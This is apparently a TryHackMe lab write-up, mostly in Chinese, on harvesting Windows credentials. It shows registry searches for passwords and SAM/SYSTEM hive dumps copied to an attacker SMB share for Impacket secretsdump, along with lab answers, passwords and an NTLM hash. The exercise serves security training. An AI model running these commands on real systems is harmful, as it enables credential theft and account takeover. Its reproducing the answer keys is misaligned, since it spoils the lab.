# Task 2  Credentials Harvesting

```
xfreerdp /u:thm /p:'Passw0rd!' /v:10.10.188.234 +clipboard
```

# Task 3  Credential Access

用户凭据通常会出现在：

1. Clear-text files（明文文件）

攻击者可能感兴趣的一些明文文件类型：

> Commands history（命令行历史记录）
> Configuration files (Web App, FTP files, etc.)（配置文件）
> Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)（与 Windows 应用程序（Internet 浏览器、电子邮件客户端等）相关的其他文件）
> Backup files（备份文件）
> Shared files and folders（共享文件夹和文件）
> Registry（注册表）
> Source code （源代码）


powershell历史记录存储在：
```
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

2. Database files（数据库文件）

3. Memory（内存）

包括

> Clear-text credentials（明文凭据）
> Cached passwords（缓存密码）
> AD Tickets（活动目录票据）

4. Password managers（密码管理器）

分为：
> Built-in password managers (Windows)(内置密码管理器 (Windows))
> Third-party: KeePass, 1Password, LastPass（第三方：KeePass、1Password、LastPass）

5. Enterprise Vaults（企业保险库）

6. Active Directory（活动目录）

一些可能泄露用户凭据的 Active Directory 错误配置

> Users' description: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorized access. (用户描述：管理员在新员工的描述中设置密码并留在那里，这使得帐户容易受到未经授权的访问)

> Group Policy SYSVOL: Leaked encryption keys let attackers access administrator accounts. (组策略 SYSVOL：泄露的加密密钥让攻击者可以访问管理员帐户)

> NTDS: Contains AD users' credentials, making it a target for attackers.(包含 AD 用户的凭据，使其成为攻击者的目标)

> AD Attacks: Misconfiguration makes AD vulnerable to various attacks(AD 攻击：错误配置使 AD 容易受到各种攻击)

7. Network Sniffing（网络嗅探）

使用命令
```
reg query HKLM /f password /t REG_SZ /s

<skip..>
HKEY_LOCAL_MACHINE\SYSTEM\THM
    flag    REG_SZ    password: 7tyh4ckm3
```

> Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?

> 7tyh4ckm3

> Enumerate the AD environment we provided. What is the password of the victim user found in the description section?

> Passw0rd!@#


# Task 4  Local Windows Credentials

转存sam和system文件
```
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.
```

kali开一个共享
```
/usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username thm -password Passw0rd!
```

复制文件到kali
```
C:\Users\Administrator\Desktop>copy sam-reg \\10.13.21.169\share\
        1 file(s) copied.

C:\Users\Administrator\Desktop>copy system-reg \\10.13.21.169\share\
		1 file(s) copied.
```

使用secretsdump.py dump出哈希

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -sam /root/tryhackme/sam-reg -system /root/tryhackme/system-reg LOCAL
```

> Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account?

> 98d3a787a80d08385cea7fb4aa2a4261